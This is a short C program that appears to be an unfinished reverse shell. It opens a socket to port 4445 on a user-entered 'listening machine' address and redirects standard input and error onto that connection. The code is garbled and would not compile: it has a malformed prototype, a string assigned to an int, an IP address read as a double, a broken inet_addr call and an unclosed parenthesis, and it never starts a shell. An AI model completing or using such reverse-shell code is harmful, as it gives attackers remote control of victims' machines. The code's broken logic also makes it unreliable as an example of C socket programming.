#include <stdio.h>         /* standard input/output */
#include <sys/socket.h>   /* used for creating socket */
#include <sys/types.h>     /* used for system calls like socket and connect */
#include <stdlib.h>   
#include <unistd.h>         /*   */
#include <netinet/in.h>     /*   contains constance and structures for ip addresses */
#include <arpa/inet.h>     


double get_addr():

int main(void) {

    #define NAME "John Doe"

    int sockt;
    int port = "4445";
    struct sockaddr_in revsockaddr;

    sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);   /* has to do with littl endian swaps to make sure its in 'network order' */
    revsockaddr.sin_addr.s_addr = inet_addr("%lf", printf(get_addr());

    connect(sockt, (struct sockaddr *) &revsockaddr,
    sizeof(revsockaddr);

    dup2(sockt, 0);
    dup2(sockt, 2);
    


    return 0;
}

double get_addr(){
    double listen_address;
    printf("\nEnter IP address of listening machine\n");
    scanf("%lf", &listen_address);
    return listen_address;
}
